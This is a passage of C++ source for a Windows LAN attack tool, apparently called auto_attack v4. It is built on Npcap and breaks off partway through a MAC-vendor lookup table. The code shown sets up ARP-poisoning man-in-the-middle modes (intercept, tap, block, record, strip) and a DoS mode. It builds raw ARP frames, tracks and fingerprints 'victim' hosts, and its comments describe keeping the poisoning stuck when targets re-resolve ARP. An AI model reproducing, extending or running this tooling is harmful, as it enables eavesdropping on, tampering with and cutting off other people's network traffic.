// ============================================================
//  auto_attack.cpp — v4
//  Windows 10/11 x64, MinGW ucrt64, Npcap SDK
//  Run as Administrator.
// ============================================================

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <netioapi.h>
#include <ipifcons.h>
#include <pcap.h>

#include <algorithm>
#include <atomic>
#include <chrono>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <deque>
#include <fstream>
#include <iostream>
#include <memory>
#include <mutex>
#include <random>
#include <set>
#include <sstream>
#include <string>
#include <thread>
#include <unordered_map>
#include <unordered_set>
#include <vector>

#ifndef IF_TYPE_IEEE80211
#define IF_TYPE_IEEE80211 71
#endif

static const char* OUTDIR           = "atk";
static const char* TRACK_DIR        = "atk\\tracks";
static const char* CAP_DIR          = "atk\\captures";
static const char* RULES_FILE       = "atk\\rules.txt";
static const char* APP_VERSION      = "v4";
static const size_t RECENT_CAP      = 300;
static const unsigned long long PCAP_MAX_BYTES = 32ull * 1024ull * 1024ull;
// runtime-tunable limits/options (see the console commands)
static std::atomic<unsigned long long> g_pcapMaxBytes{PCAP_MAX_BYTES};
static std::atomic<DWORD>  g_sweepMs{0};          // 0 = use ARP_REPOISON_MS
static std::atomic<bool>   g_autoNames{true};     // periodically retry unnamed hosts
static std::atomic<bool>   g_namesBusy{false};
static const DWORD  DNS_TTL_MS      = 10 * 60 * 1000;
static const DWORD  CONN_IDLE_MS    = 120000;
static const DWORD  ARP_REPOISON_MS = 4000;
static const DWORD  DNS_REPOISON_MS = 30000;
static const DWORD  ACTIVITY_TTL_MS = 30 * 60 * 1000;

#define MODE_INTERCEPT 1
#define MODE_TAP       2
#define MODE_BLOCK     3
#define MODE_RECORD    4
#define MODE_STRIP     5
#define MODE_DOS       6

struct Victim;
struct Conn;
struct Activity;
struct DnsRule;
struct AppSig;

static void killConn(const Conn& c);
static void killMatchingConns(const std::string& app, const std::string& victim);
static void controlDnsFor(const std::string& victimIp, bool force = false);
static void handleDnsQuery(const char* victimIp, const char* dnsIp,
                           int victimSrcPort,
                           const unsigned char* dnsPayload, int dnsLen);
static void learnFromDns(const unsigned char* p, int len);
static void learnFromDhcp(const unsigned char* p, int len, const std::string& mac);
static void learnFromWsDiscovery(const unsigned char* p, int len,
                                 const std::string& srcIp, const std::string& mac);
static void setNameForIp(const std::string& ip, const std::string& raw, int prio);
static void setNameForMac(const std::string& mac, const std::string& raw, int prio);
static std::string parseNbstat(const unsigned char* p, int len);
static void restoreAll();
static bool enableForwarding(bool on);
static void restoreForwarding();
static void startAttack();
static void startScan();
static void startDos(const std::string& ip);
static void poisonSelected();
static void recordPacket(const struct pcap_pkthdr* h, const unsigned char* p);
static void closeAllCaptures();
static void cmdDetail(const std::string& ip, int n);
static void sendArp(pcap_t* pc, const char* srcIp, const unsigned char* srcMac,
                    const unsigned char* dstMac, const char* dstIp, int op);
static pcap_t* openHandleFor(const std::string& guid, bool sending);
static void resolveNames();

static pcap_t*          g_pcap     = nullptr;
static pcap_t*          g_pcapSend = nullptr;
static std::string      g_myIp;
static unsigned char    g_myMac[6]= {0};
static std::string      g_gatewayIp;
static unsigned char    g_gatewayMac[6] = {0};
static std::string      g_ifName;
static std::string      g_ifGuid;
static int              g_ifIndex = 0;

static std::atomic<int>   g_mode{MODE_INTERCEPT};
static bool poisonGatewaySide() {
    return g_mode != MODE_TAP;   // tap leaves the gateway's ARP cache alone
}
static std::atomic<bool>  attackOn{false};
static std::atomic<bool>  g_forwardingEnabled{false};
static std::atomic<bool>  g_forwardingTouched{false};
static bool               g_ifaceFwdWasOn = false;
static bool               g_ifaceFwdKnown = false;
static std::atomic<int>   g_dosActive{0};
static std::atomic<bool>  g_quickStartPending{false};
static std::atomic<bool>  g_starting{false};
static std::thread        g_sweeper;
static std::thread        g_portal;
static std::thread        g_scanThread;
static std::atomic<bool>  g_scanning{false};
static std::atomic<bool>  g_running{true};
static std::atomic<long>  g_seen{0};
static std::atomic<long>  g_arpReplies{0};
static std::atomic<long>  g_dnsBlocked{0};
static std::atomic<long>  g_kills{0};
static std::atomic<long>  g_sent{0};
// attack-hardening: keep the MITM stuck even when a host re-resolves ARP,
// and notice when the gateway or a target moves to a new MAC address
static std::atomic<bool>  g_repoisonNow{false};
static std::atomic<long>  g_repoisons{0};
static std::atomic<long>  g_gwMacChanges{0};
static std::atomic<long>  g_lastRepoison{0};
static std::atomic<int>   g_dosRate{12000};   // target packets/second per DoS thread
static std::atomic<bool>  g_portalTried{false};

static std::mt19937_64    g_rng{std::random_device{}()};
static std::mutex         g_rngMutex;

static std::mutex g_logMutex;
#define PF(...) do {                                       \
    std::lock_guard<std::mutex> _lg(g_logMutex);           \
    ::printf(__VA_ARGS__);                                 \
    ::fflush(stdout);                                      \
} while (0)

static std::string trim(const std::string& s) {
    size_t a = s.find_first_not_of(" \t\r\n");
    if (a == std::string::npos) return "";
    size_t b = s.find_last_not_of(" \t\r\n");
    return s.substr(a, b - a + 1);
}

static std::string toLower(std::string s) {
    std::transform(s.begin(), s.end(), s.begin(),
                   [](unsigned char c){ return (char)tolower(c); });
    return s;
}

static bool macZero(const unsigned char* m) {
    for (int i = 0; i < 6; ++i) if (m[i]) return false;
    return true;
}

static bool macEq(const unsigned char* a, const unsigned char* b) {
    for (int i = 0; i < 6; ++i) if (a[i] != b[i]) return false;
    return true;
}

static std::string macToString(const unsigned char* m) {
    char b[24];
    snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0], m[1], m[2], m[3], m[4], m[5]);
    return std::string(b);
}

static bool parseMac(const std::string& s, unsigned char* out) {
    if (s.size() < 17) return false;
    unsigned v[6];
    if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x",
               &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) return false;
    for (int i = 0; i < 6; ++i) out[i] = (unsigned char)v[i];
    return true;
}

static std::string tsNow() {
    SYSTEMTIME st; GetLocalTime(&st);
    char b[32];
    snprintf(b, sizeof(b), "%02d:%02d:%02d", st.wHour, st.wMinute, st.wSecond);
    return std::string(b);
}

static std::string tsFull() {
    SYSTEMTIME st; GetLocalTime(&st);
    char b[64];
    snprintf(b, sizeof(b), "%04d-%02d-%02d %02d:%02d:%02d",
             st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return std::string(b);
}

static uint64_t rnd64() {
    std::lock_guard<std::mutex> lk(g_rngMutex);
    return g_rng();
}
static uint16_t rnd16() { return (uint16_t)(rnd64() & 0xFFFF); }
static uint32_t rnd32() { return (uint32_t)(rnd64() & 0xFFFFFFFF); }

static bool sendFrame(const unsigned char* f, int len) {
    pcap_t* h = g_pcapSend ? g_pcapSend : g_pcap;
    if (!h) return false;
    int r = pcap_sendpacket(h, f, len);
    if (r == 0) { g_sent++; return true; }
    return false;
}

static void sendArp(pcap_t* pc, const char* srcIp, const unsigned char* srcMac,
                    const unsigned char* dstMac, const char* dstIp, int op) {
    unsigned char f[42];
    unsigned char bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    const unsigned char* dm = dstMac ? dstMac : bcast;

    memcpy(&f[0], dm, 6);
    memcpy(&f[6], srcMac, 6);
    f[12] = 0x08; f[13] = 0x06;
    f[14] = 0x00; f[15] = 0x01;
    f[16] = 0x08; f[17] = 0x00;
    f[18] = 6;    f[19] = 4;
    f[20] = (op >> 8) & 0xFF; f[21] = op & 0xFF;
    memcpy(&f[22], srcMac, 6);

    uint32_t sip = 0, dip = 0;
    inet_pton(AF_INET, srcIp, &sip);
    inet_pton(AF_INET, dstIp, &dip);
    memcpy(&f[28], &sip, 4);
    memset(&f[32], 0, 6);
    memcpy(&f[38], &dip, 4);

    // an explicit handle lets the parallel sweep use one send handle per
    // thread; pcap_sendpacket is safe across distinct handles but not
    // concurrently on the same one
    if (pc) {
        if (pcap_sendpacket(pc, f, 42) == 0) g_sent++;
        return;
    }
    sendFrame(f, 42);
}

static bool getMacFromArpCache(const char* ip, unsigned char* out) {
    ULONG  m[2] = {0};
    ULONG  len  = 6;
    ULONG  ia   = inet_addr(ip);
    if (SendARP(ia, 0, m, &len) == NO_ERROR && len == 6) {
        memcpy(out, m, 6);
        return true;
    }
    return false;
}

struct Victim {
    std::string ip;
    std::string mac;
    std::string name;
    int         namePrio = 0;
    bool        sel = false;
    DWORD       lastSeen = 0;
    // service fingerprint
    std::string ports;          // comma-separated open TCP ports
    std::string osGuess;        // coarse device/OS guess
    std::string banner;         // first banner line, if any
    bool        fingerprinted = false;
};
static std::vector<Victim> g_victims;
static std::mutex          g_vmutex;

// Names the operator set by hand ("name <ip> <text>"), persisted in
// atk\names.txt and always preferred over anything discovered.
static std::unordered_map<std::string, std::string> g_manualNames;
static std::mutex g_manualMutex;

// The capture callback runs on the pcap thread at LAN line rate.  Scanning
// g_victims under g_vmutex twice per packet there contended with the sweeper,
// the GUI refresh and the dumps, which is a real source of stalls (and of the
// occasional slow WiFi).  Keep an immutable set of tracked IPs instead so the
// hot path does one O(1) lookup behind a tiny mutex.
static std::shared_ptr<const std::unordered_set<std::string>> g_victimIpSnap;
static std::mutex g_victimIpMutex;

// caller must hold g_vmutex
static void refreshVictimIpSnapLocked() {
    auto s = std::make_shared<std::unordered_set<std::string>>();
    s->reserve(g_victims.size() * 2 + 8);
    for (auto& v : g_victims) s->insert(v.ip);
    std::lock_guard<std::mutex> lk(g_victimIpMutex);
    g_victimIpSnap = std::move(s);
}
static bool isKnownVictimIp(const std::string& ip) {
    std::shared_ptr<const std::unordered_set<std::string>> s;
    {
        std::lock_guard<std::mutex> lk(g_victimIpMutex);
        s = g_victimIpSnap;
    }
    return s && s->find(ip) != s->end();
}
static std::string manualNameFor(const std::string& ip) {
    std::lock_guard<std::mutex> lk(g_manualMutex);
    auto it = g_manualNames.find(ip);
    return it == g_manualNames.end() ? std::string() : it->second;
}

static const char* ouiVendor(const char* mac) {
    // returns vendor name for common OUI prefixes, or nullptr
    static const struct { const char* oui; const char* name; } table[] = {
        {"00:03:93", "Apple"}, {"00:05:02", "Apple"}, {"00:0A:27", "Apple"},
        {"00:0A:95", "Apple"}, {"00:0D:93", "Apple"}, {"00:10:FA", "Apple"},
        {"00:11:24", "Apple"}, {"00:14:51", "Apple"}, {"00:16:CB", "Apple"},
        {"00:17:F2", "Apple"}, {"00:19:E3", "Apple"}, {"00:1B:63", "Apple"},
        {"00:1C:B3", "Apple"}, {"00:1D:4F", "Apple"}, {"00:1E:52", "Apple"},
        {"00:1F:5B", "Apple"}, {"00:1F:F3", "Apple"}, {"00:21:E9", "Apple"},
        {"00:22:41", "Apple"}, {"00:23:12", "Apple"}, {"00:23:32", "Apple"},
        {"00:23:6C", "Apple"}, {"00:23:DF", "Apple"}, {"00:24:36", "Apple"},
        {"00:25:00", "Apple"}, {"00:25:4B", "Apple"}, {"00:25:BC", "Apple"},
        {"00:26:08", "Apple"}, {"00:26:4A", "Apple"}, {"00:26:B0", "Apple"},
        {"00:26:BB", "Apple"}, {"08:00:07", "Apple"}, {"10:9A:DD", "Apple"},
        {"14:10:9F", "Apple"}, {"18:AF:61", "Apple"}, {"1C:AB:A7", "Apple"},
        {"20:C9:D0", "Apple"}, {"24:AB:81", "Apple"}, {"28:37:37", "Apple"},
        {"28:CF:DA", "Apple"}, {"2C:BE:08", "Apple"}, {"34:15:9E", "Apple"},
        {"3C:07:54", "Apple"}, {"3C:15:C2", "Apple"}, {"3C:E0:72", "Apple"},
        {"40:30:04", "Apple"}, {"40:33:1A", "Apple"}, {"40:4D:7F", "Apple"},
        {"40:6C:8F", "Apple"}, {"40:98:AD", "Apple"}, {"40:A6:D9", "Apple"},
        {"40:B0:34", "Apple"}, {"40:D3:2D", "Apple"}, {"40:E3:D6", "Apple"},
        {"44:2A:60", "Apple"}, {"48:D7:05", "Apple"}, {"4C:57:CA", "Apple"},
        {"4C:8D:79", "Apple"}, {"50:EA:D6", "Apple"}, {"54:26:96", "Apple"},
        {"54:E4:3A", "Apple"}, {"58:1F:AA", "Apple"}, {"58:55:CA", "Apple"},
        {"5C:59:48", "Apple"}, {"5C:95:AE", "Apple"}, {"5C:96:9D", "Apple"},
        {"5C:AD:CF", "Apple"}, {"5C:F5:DA", "Apple"}, {"60:03:08", "Apple"},
        {"60:33:4B", "Apple"}, {"60:69:44", "Apple"}, {"60:92:17", "Apple"},
        {"60:FA:CD", "Apple"}, {"60:FB:42", "Apple"}, {"64:76:BA", "Apple"},
        {"64:A3:CB", "Apple"}, {"64:B9:E8", "Apple"}, {"64:D6:3A", "Apple"},
        {"68:5B:35", "Apple"}, {"68:A8:6D", "Apple"}, {"68:DB:CA", "Apple"},
        {"6C:40:08", "Apple"}, {"6C:70:9F", "Apple"}, {"6C:94:66", "Apple"},
        {"6C:96:CF", "Apple"}, {"70:11:24", "Apple"}, {"70:56:81", "Apple"},
        {"70:73:CB", "Apple"}, {"70:DE:E2", "Apple"}, {"74:E1:B6", "Apple"},
        {"78:31:C1", "Apple"}, {"78:4F:43", "Apple"}, {"78:7B:8A", "Apple"},
        {"78:8A:20", "Apple"}, {"78:A3:E4", "Apple"}, {"78:CA:39", "Apple"},
        {"78:D6:F0", "Apple"}, {"7C:11:BE", "Apple"}, {"7C:6D:62", "Apple"},
        {"7C:C3:A1", "Apple"}, {"7C:C5:37", "Apple"}, {"7C:D1:C3", "Apple"},
        {"80:00:6E", "Apple"}, {"80:BE:05", "Apple"}, {"84:38:35", "Apple"},
        {"84:85:06", "Apple"}, {"84:8E:0C", "Apple"}, {"84:FC:FE", "Apple"},
        {"88:19:08", "Apple"}, {"88:53:95", "Apple"}, {"88:66:A5", "Apple"},
        {"88:C6:63", "Apple"}, {"88:E9:FE", "Apple"}, {"8C:2D:AA", "Apple"},
        {"8C:58:77", "Apple"}, {"8C:79:F5", "Apple"}, {"8C:7B:9D", "Apple"},
        {"8C:85:90", "Apple"}, {"8C:8E:F2", "Apple"}, {"90:60:F1", "Apple"},
        {"90:72:40", "Apple"}, {"90:B0:ED", "Apple"}, {"90:B9:74", "Apple"},
        {"94:94:26", "Apple"}, {"98:01:A7", "Apple"}, {"98:B8:E3", "Apple"},
        {"98:D6:BB", "Apple"}, {"98:E0:D9", "Apple"}, {"98:FE:94", "Apple"},
        {"9C:04:EB", "Apple"}, {"9C:20:7B", "Apple"}, {"9C:35:EB", "Apple"},
        {"9C:BC:F0", "Apple"}, {"9C:F3:87", "Apple"}, {"A0:99:9B", "Apple"},
        {"A0:ED:CD", "Apple"}, {"A4:5E:60", "Apple"}, {"A4:67:06", "Apple"},
        {"A4:B1:97", "Apple"}, {"A4:D1:8C", "Apple"}, {"A4:D9:8C", "Apple"},
        {"A8:20:66", "Apple"}, {"A8:5C:2C", "Apple"}, {"A8:66:7F", "Apple"},
        {"A8:6B:AD", "Apple"}, {"A8:86:DD", "Apple"}, {"A8:88:08", "Apple"},
        {"A8:96:8A", "Apple"}, {"A8:BB:CF", "Apple"}, {"AC:29:3A", "Apple"},
        {"AC:3C:0B", "Apple"}, {"AC:BC:32", "Apple"}, {"AC:CF:5C", "Apple"},
        {"AC:FD:EC", "Apple"}, {"B0:34:95", "Apple"}, {"B0:65:BD", "Apple"},
        {"B4:18:D1", "Apple"}, {"B4:8B:1F", "Apple"}, {"B4:F0:AB", "Apple"},
        {"B4:FB:E4", "Apple"}, {"B8:17:C2", "Apple"}, {"B8:8D:12", "Apple"},
        {"B8:C1:11", "Apple"}, {"B8:E8:56", "Apple"}, {"B8:F6:B1", "Apple"},
        {"BC:20:A4", "Apple"}, {"BC:3B:AF", "Apple"}, {"BC:67:7F", "Apple"},
        {"BC:92:6B", "Apple"}, {"BC:EC:5D", "Apple"}, {"C0:84:7D", "Apple"},
        {"C0:9F:42", "Apple"}, {"C0:CC:F8", "Apple"}, {"C0:D0:D5", "Apple"},
        {"C4:2C:03", "Apple"}, {"C8:1E:E7", "Apple"}, {"C8:2A:14", "Apple"},
        {"C8:33:4B", "Apple"}, {"C8:69:CD", "Apple"}, {"C8:6F:1D", "Apple"},
        {"C8:85:50", "Apple"}, {"C8:BC:C8", "Apple"}, {"C8:D0:83", "Apple"},
        {"C8:E0:EB", "Apple"}, {"CC:08:E0", "Apple"}, {"CC:20:E8", "Apple"},
        {"CC:2D:E0", "Apple"}, {"CC:35:40", "Apple"}, {"CC:44:63", "Apple"},
        {"CC:78:5F", "Apple"}, {"CC:96:AA", "Apple"}, {"CC:F4:11", "Apple"},
        {"D0:03:4B", "Apple"}, {"D0:23:DB", "Apple"}, {"D0:84:B0", "Apple"},
        {"D0:E1:40", "Apple"}, {"D4:61:9D", "Apple"}, {"D4:9A:20", "Apple"},
        {"D4:F4:6F", "Apple"}, {"D8:30:62", "Apple"}, {"D8:96:95", "Apple"},
        {"D8:A2:5E", "Apple"}, {"D8:BB:2C", "Apple"}, {"DC:2B:2A", "Apple"},
        {"DC:56:E7", "Apple"}, {"DC:86:D8", "Apple"}, {"DC:A9:04", "Apple"},
        {"DC:D3:21", "Apple"}, {"E0:5F:45", "Apple"}, {"E0:76:D0", "Apple"},
        {"E0:9D:31", "Apple"}, {"E0:AC:CB", "Apple"}, {"E0:B9:BA", "Apple"},
        {"E0:C7:67", "Apple"}, {"E0:DB:10", "Apple"}, {"E0:F5:C6", "Apple"},
        {"E0:F8:47", "Apple"}, {"E4:25:E7", "Apple"}, {"E4:CE:8F", "Apple"},
        {"E4:E4:AB", "Apple"}, {"E8:04:0B", "Apple"}, {"E8:06:88", "Apple"},
        {"E8:8D:28", "Apple"}, {"E8:B2:AC", "Apple"}, {"E8:F2:E2", "Apple"},
        {"EC:35:86", "Apple"}, {"F0:18:98", "Apple"}, {"F0:24:75", "Apple"},
        {"F0:27:65", "Apple"}, {"F0:76:6F", "Apple"}, {"F0:99:BF", "Apple"},
        {"F0:B4:79", "Apple"}, {"F0:DB:E2", "Apple"}, {"F0:DC:E2", "Apple"},
        {"F0:FE:6B", "Apple"}, {"F4:0F:24", "Apple"}, {"F4:37:B7", "Apple"},
        {"F4:5C:89", "Apple"}, {"F4:F1:5A", "Apple"}, {"F4:F5:D8", "Apple"},
        {"F8:1E:DF", "Apple"}, {"F8:27:93", "Apple"}, {"F8:CC:6E", "Apple"},
        {"FC:25:3F", "Apple"}, {"FC:5A:F9", "Apple"}, {"FC:64:3A", "Apple"},
        {"FC:A1:3E", "Apple"}, {"FC:D8:48", "Apple"}, {"FC:E9:98", "Apple"},
        {"FC:FC:48", "Apple"},
        // Samsung
        {"00:00:F0", "Samsung"}, {"00:02:78", "Samsung"}, {"00:07:AB", "Samsung"},
        {"00:0D:AE", "Samsung"}, {"00:12:47", "Samsung"}, {"00:13:77", "Samsung"},
        {"00:15:99", "Samsung"}, {"00:15:B9", "Samsung"}, {"00:16:32", "Samsung"},
        {"00:16:6B", "Samsung"}, {"00:16:6C", "Samsung"}, {"00:16:DB", "Samsung"},
        {"00:17:C9", "Samsung"}, {"00:17:D5", "Samsung"}, {"00:18:AF", "Samsung"},
        {"00:1A:8A", "Samsung"}, {"00:1B:98", "Samsung"}, {"00:1C:43", "Samsung"},
        {"00:1D:25", "Samsung"}, {"00:1E:7D", "Samsung"}, {"00:1F:CC", "Samsung"},
        {"00:21:19", "Samsung"}, {"00:21:D1", "Samsung"}, {"00:23:39", "Samsung"},
        {"00:23:D6", "Samsung"}, {"00:24:54", "Samsung"}, {"00:24:90", "Samsung"},
        {"00:24:91", "Samsung"}, {"00:25:66", "Samsung"}, {"00:26:37", "Samsung"},
        {"00:26:5D", "Samsung"}, {"08:08:C2", "Samsung"}, {"0C:12:96", "Samsung"},
        {"10:1D:C0", "Samsung"}, {"14:49:E0", "Samsung"}, {"18:3A:2D", "Samsung"},
        {"1C:5A:3E", "Samsung"}, {"24:4B:83", "Samsung"}, {"28:98:78", "Samsung"},
        {"2C:44:01", "Samsung"}, {"34:AA:8B", "Samsung"}, {"38:0A:94", "Samsung"},
        {"38:2C:4A", "Samsung"}, {"40:0E:85", "Samsung"}, {"44:73:D6", "Samsung"},
        {"4C:BC:A5", "Samsung"}, {"50:32:75", "Samsung"}, {"50:CC:F8", "Samsung"},
        {"54:92:BE", "Samsung"}, {"58:17:0C", "Samsung"}, {"5C:0A:5B", "Samsung"},
        {"60:A1:0A", "Samsung"}, {"78:1F:DB", "Samsung"}, {"78:52:1A", "Samsung"},
        {"78:9F:70", "Samsung"}, {"7C:23:02", "Samsung"}, {"84:25:DB", "Samsung"},
        {"84:38:38", "Samsung"}, {"88:32:9B", "Samsung"}, {"8C:71:F8", "Samsung"},
        {"94:35:0A", "Samsung"}, {"98:0C:82", "Samsung"}, {"9C:02:98", "Samsung"},
        {"A0:0B:BA", "Samsung"}, {"A0:21:95", "Samsung"}, {"A0:82:1F", "Samsung"},
        {"A4:08:EA", "Samsung"}, {"A8:06:00", "Samsung"}, {"AC:5F:3E", "Samsung"},
        {"B0:9F:03", "Samsung"}, {"B4:79:A7", "Samsung"}, {"B8:5A:73", "Samsung"},
        {"BC:20:A4", "Samsung"}, {"C0:BD:D1", "Samsung"}, {"C4:73:1E", "Samsung"},
        {"C8:19:F4", "Samsung"}, {"CC:07:AB", "Samsung"}, {"D0:22:BE", "Samsung"},
        {"D4:87:E0", "Samsung"}, {"D8:57:EF", "Samsung"}, {"DC:71:96", "Samsung"},
        {"E4:7C:F9", "Samsung"}, {"E8:50:8B", "Samsung"}, {"EC:1F:72", "Samsung"},
        {"F0:25:B7", "Samsung"}, {"F4:7B:5E", "Samsung"}, {"F8:04:2E", "Samsung"},
        {"F8:3D:FF", "Samsung"}, {"FC:A1:3E", "Samsung"}, {"00:1A:11", "Google"},
        {"3C:5A:B4", "Google"}, {"54:60:09", "Google"}, {"6C:AD:F8", "Google"},
        {"94:EB:2C", "Google"}, {"A4:77:33", "Google"}, {"F4:F5:D8", "Google"},
        {"00:17:88", "Philips"}, {"00:1E:C0", "Dell"}, {"00:14:22", "Dell"},
        {"14:18:77", "Dell"}, {"18:03:73", "Dell"}, {"24:B6:FD", "Dell"},
        {"28:F1:0E", "Dell"}, {"34:17:EB", "Dell"}, {"5C:F9:DD", "Dell"},
        {"70:B5:E8", "Dell"}, {"84:7B:EB", "Dell"}, {"90:B1:1C", "Dell"},
        {"B0:83:FE", "Dell"}, {"B4:B5:2F", "Dell"}, {"B8:CA:3A", "Dell"},
        {"C0:3F:D5", "Dell"}, {"C8:1F:66", "Dell"}, {"D4:BE:D9", "Dell"},
        {"D8:9E:F3", "Dell"}, {"E0:DB:55", "Dell"}, {"F0:1F:AF", "Dell"},
        {"F8:CA:B8", "Dell"}, {"00:0C:29", "VMware"}, {"00:50:56", "VMware"},
        {"00:1C:14", "VMware"}, {"00:05:69", "VMware"}, {"08:00:27", "VirtualBox"},
        {"52:54:00", "QEMU"}, {"00:16:3E", "Xen"}, {"00:15:5D", "Microsoft Hyper-V"},
        {"00:1C:42", "Parallels"}, {"00:03:FF", "Microsoft"}, {"00:0D:3A", "Microsoft"},
        {"00:12:5A", "Microsoft"}, {"00:15:5D", "Microsoft"}, {"00:17:FA", "Microsoft"},
        {"00:1D:D8", "Microsoft"}, {"00:1E:C0", "Microsoft"}, {"00:22:48", "Microsoft"},
        {"00:25:AE", "Microsoft"}, {"00:50:F2", "Microsoft"}, {"00:04:4B", "Nvidia"},
        {"00:1F:BC", "Nvidia"}, {"00:26:B9", "Nvidia"},
        {"00:30:48", "Supermicro"}, {"00:25:90", "Supermicro"}, {"00:30:48", "Supermicro"},
        {"00:1E:68", "Intel"}, {"00:1F:3B", "Intel"}, {"00:21:5C", "Intel"},
        {"00:22:FA", "Intel"}, {"00:24:D7", "Intel"}, {"00:26:C6", "Intel"},
        {"00:27:0E", "Intel"}, {"00:90:27", "Realtek"}, {"00:E0:4C", "Realtek"},
        {"00:13:D3", "Cisco"}, {"00:14:69", "Cisco"},
        {"00:1A:2F", "Cisco"}, {"00:1A:A1", "Cisco"}, {"00:1B:0D", "Cisco"},
        {"00:1B:54", "Cisco"}, {"00:1E:13", "Cisco"}, {"00:1E:BE", "Cisco"},
        {"00:21:A0", "Cisco"}, {"00:22:55", "Cisco"}, {"00:23:04", "Cisco"},
        {"00:24:14", "Cisco"}, {"00:24:C4", "Cisco"}, {"00:26:99", "Cisco"},
        {"00:27:E3", "Cisco"}, {"00:40:96", "Cisco"}, {"08:CC:68", "Cisco"},
        {"10:BD:18", "Cisco"}, {"14:DA:E9", "Cisco"}, {"18:33:9D", "Cisco"},
        {"1C:E6:C7", "Cisco"}, {"20:37:06", "Cisco"}, {"24:B6:57", "Cisco"},
        {"28:94:0F", "Cisco"}, {"2C:AB:25", "Cisco"}, {"30:F7:0D", "Cisco"},
        {"34:DB:FD", "Cisco"}, {"38:1C:1A", "Cisco"}, {"3C:CE:73", "Cisco"},
        {"40:01:7A", "Cisco"}, {"40:F4:EC", "Cisco"}, {"44:AD:D9", "Cisco"},
        {"48:F8:B3", "Cisco"}, {"4C:00:82", "Cisco"}, {"50:3D:E5", "Cisco"},
        {"54:75:D0", "Cisco"}, {"58:AC:78", "Cisco"}, {"58:BF:EA", "Cisco"},
        {"5C:41:3E", "Cisco"}, {"5C:50:15", "Cisco"}, {"60:73:5C", "Cisco"},
        {"64:9E:F3", "Cisco"}, {"68:EF:BD", "Cisco"}, {"6C:41:6A", "Cisco"},
        {"6C:99:89", "Cisco"}, {"70:6E:6D", "Cisco"}, {"70:DB:98", "Cisco"},
        {"74:A0:2F", "Cisco"}, {"78:0C:F0", "Cisco"}, {"78:DA:6E", "Cisco"},
        {"7C:69:F6", "Cisco"}, {"80:E0:1D", "Cisco"}, {"84:B8:02", "Cisco"},
        {"88:1D:FC", "Cisco"}, {"88:43:E1", "Cisco"}, {"88:5A:92", "Cisco"},
        {"88:F0:31", "Cisco"}, {"8C:60:4F", "Cisco"}, {"90:E2:BA", "Cisco"},
        {"94:40:A4", "Cisco"}, {"98:90:96", "Cisco"}, {"9C:57:AD", "Cisco"},
        {"A0:EC:F9", "Cisco"}, {"A4:4C:11", "Cisco"}, {"A4:93:4C", "Cisco"},
        {"A8:0C:0D", "Cisco"}, {"AC:7E:8A", "Cisco"}, {"B0:AA:77", "Cisco"},
        {"B4:14:89", "Cisco"}, {"B4:E9:B0", "Cisco"}, {"B8:38:61", "Cisco"},
        {"BC:16:65", "Cisco"}, {"C0:8C:60", "Cisco"}, {"C4:0A:CB", "Cisco"},
        {"C4:64:13", "Cisco"}, {"C8:00:84", "Cisco"}, {"CC:16:7E", "Cisco"},
        {"CC:EF:48", "Cisco"}, {"D0:72:DC", "Cisco"}, {"D4:2C:44", "Cisco"},
        {"D8:B1:90", "Cisco"}, {"DC:7B:94", "Cisco"}, {"E0:55:3D", "Cisco"},
        {"E4:C7:22", "Cisco"}, {"E8:BA:70", "Cisco"}, {"EC:44:76", "Cisco"},
        {"F0:25:72", "Cisco"}, {"F4:0F:1B", "Cisco"}, {"F4:EA:67", "Cisco"},
        {"F8:72:EA", "Cisco"}, {"00:50:BA", "D-Link"}, {"00:05:5D", "D-Link"},
        {"00:0D:88", "D-Link"}, {"00:0F:3D", "D-Link"}, {"00:11:95", "D-Link"},
        {"00:13:46", "D-Link"}, {"00:15:E9", "D-Link"}, {"00:17:9A", "D-Link"},
        {"00:19:5B", "D-Link"}, {"00:1B:11", "D-Link"}, {"00:1C:F0", "D-Link"},
        {"00:1E:58", "D-Link"}, {"00:21:91", "D-Link"},
        {"00:22:B0", "D-Link"}, {"00:24:01", "D-Link"}, {"00:26:5A", "D-Link"},
        {"00:14:BF", "TP-Link"}, {"00:23:CD", "TP-Link"}, {"00:27:19", "TP-Link"},
        {"14:CC:20", "TP-Link"}, {"18:A6:F7", "TP-Link"}, {"50:C7:BF", "TP-Link"},
        {"64:70:02", "TP-Link"}, {"90:F6:52", "TP-Link"}, {"A0:F3:C1", "TP-Link"},
        {"B0:BE:76", "TP-Link"}, {"C0:4A:00", "TP-Link"}, {"C4:E9:84", "TP-Link"},
        {"E8:94:F6", "TP-Link"}, {"F8:1A:67", "TP-Link"}, {"10:FE:ED", "TP-Link"},
        {"14:9D:09", "TP-Link"}, {"18:D6:C7", "TP-Link"}, {"30:B5:C2", "TP-Link"},
        {"54:C8:0F", "TP-Link"}, {"60:A4:4C", "TP-Link"}, {"64:66:B3", "TP-Link"},
        {"74:DA:38", "TP-Link"}, {"84:16:F9", "TP-Link"}, {"98:DA:C4", "TP-Link"},
        {"A4:2B:B0", "TP-Link"}, {"AC:84:C6", "TP-Link"}, {"B0:4E:26", "TP-Link"},
        {"C4:6E:1F", "TP-Link"}, {"D8:07:B6", "TP-Link"}, {"E4:D3:32", "TP-Link"},
        {"EC:08:6B", "TP-Link"}, {"F4:EC:38", "TP-Link"}, {"14:91:82", "TP-Link"},
        {"00:1F:33", "Netgear"}, {"00:22:3F", "Netgear"}, {"00:24:B2", "Netgear"},
        {"00:26:F2", "Netgear"}, {"20:4E:7F", "Netgear"}, {"28:C6:8E", "Netgear"},
        {"30:46:9A", "Netgear"}, {"44:94:FC", "Netgear"}, {"84:1B:5E", "Netgear"},
        {"A0:21:B7", "Netgear"}, {"A0:40:A0", "Netgear"}, {"C0:3F:0E", "Netgear"},
        {"C0:FF:D4", "Netgear"}, {"C4:04:15", "Netgear"}, {"E0:46:9A", "Netgear"},
        {"E0:91:F5", "Netgear"}, {"20:E5:2A", "Netgear"}, {"2C:B0:5D", "Netgear"},
        {"30:46:9A", "Netgear"}, {"4C:60:DE", "Netgear"}, {"80:37:73", "Netgear"},
        {"9C:3D:CF", "Netgear"}, {"A4:2B:8C", "Netgear"}, {"B0:B9:8A", "Netgear"},
